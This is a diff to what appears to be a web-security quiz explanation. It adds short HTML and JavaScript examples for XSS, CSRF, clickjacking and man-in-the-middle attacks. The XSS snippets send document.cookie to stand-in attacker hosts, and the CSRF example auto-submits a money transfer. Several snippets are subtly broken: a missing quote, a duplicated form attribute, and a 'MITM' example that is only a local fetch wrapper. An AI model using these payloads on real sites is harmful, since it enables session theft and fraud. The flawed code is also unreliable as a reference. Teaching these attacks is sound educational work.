@@ -936,11 +936,69 @@ Explanation:
 
 - A. **XSS (Cross-Site Scripting)**: This is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can be executed by the victim's browser, leading to actions like stealing user sessions, personal information, or performing actions on behalf of the user without their consent.
 
+```html
+<!-- Attacker injects this script into a comment on a blog -->
+<script>
+  // Malicious code to steal user cookies
+  const stolenCookies = document.cookie;
+  // Send the stolen data to the attacker's server
+  fetch('https://attacker.com/steal', { method: 'POST', body: stolenCookies });
+</script>
+
+<!-- Or -->
+<img src="x" onerror="fetch(https://api.evilsite.com/steal?cookie='+ encodeURIComponent(document.cookie), {method: 'POST'});" />
+```
+
 - B. **CSRF (Cross-Site Request Forgery)**: CSRF is an attack that tricks users into executing unwanted actions on a web application where they are authenticated. The attacker crafts a malicious request, and if the user is authenticated and has the necessary privileges, the request may be executed on their behalf without their knowledge.
+
+```html
+<!-- Attacker sends an email with a malicious link -->
+<a href="https://banking-site.com/transfer?to=attacker&amount=1000000">Click to claim your prize!</a>
+
+<!-- The site has this form -->
+<body onload="submitForm()">
+  <form action="https://banking-site.com/transfer" action="POST">
+    <input type="hidden" name="recipient" value="attacker">
+    <input type="hidden" name="amount" value="1000000">
+</body>
+```
 
 - C. **UI Redressing**: Also known as Clickjacking, UI Redressing tricks users into interacting with disguised or hidden elements by overlaying them on top of seemingly harmless content. This technique deceives users into clicking on elements that perform unintended actions, potentially leading to security compromises.
 
+```html
+<!-- Malicious website overlaying a transparent layer on a legitimate site's button -->
+<style>
+  #maliciousButton {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    opacity: 0;
+  }
+</style>
+
+<div id="maliciousButton"></div>
+
+<!-- Legitimate site's button -->
+<button id="legitimateButton">Click me</button>
+
+```
+
 - D. **MITM (Man-in-the-Middle)**: In a Man-in-the-Middle attack, an attacker intercepts and possibly alters the communication between two parties without their knowledge. This can occur in various forms, such as eavesdropping on unsecured Wi-Fi networks or intercepting data between a user and a website. The attacker can read, modify, or inject new data into the communication.
+
+```js
+// In a hypothetical network interceptor
+const originalFetch = window.fetch;
+
+window.fetch = function(url, options) {
+  // Log or manipulate the request before it is sent
+  console.log(`Intercepted request to ${url}`);
+  // Forward the request to the original fetch function
+  return originalFetch(url, options);
+};
+
+```
 
 </details>
 
